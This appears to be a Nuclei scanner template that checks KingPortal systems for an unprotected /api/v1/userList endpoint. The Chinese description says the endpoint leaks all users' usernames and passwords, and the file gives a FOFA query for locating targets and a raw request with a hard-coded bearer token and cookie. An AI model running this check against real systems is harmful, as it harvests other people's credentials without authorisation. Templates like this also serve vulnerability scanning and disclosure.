id: kingportal-userlist-info-leak

info:
  name: KingPortal开发系统 userList接口敏感数据暴露漏洞
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: title="KingPortal"
          通过访问/api/v1/userList接口可获取系统内所有用户凭证信息，包含管理员账户及普通用户账号密码。该接口未实施有效的访问控制机制，导致任意认证用户均可调用此接口获取敏感数据。攻击者可利用此漏洞批量获取用户凭证实现横向渗透攻击。
  tags: KingPortal开发系统

http:
- raw:
  - |
    GET /api/v1/userList HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/plain, */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Authorization:Bearer 7b0ca80ff1b6cea62c7572156bd8b059d6556c21
    Connection: close
    Cookie: 543641e5-2c05-44b1-8ab6-87bbdad6a889=admin001
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'userName'
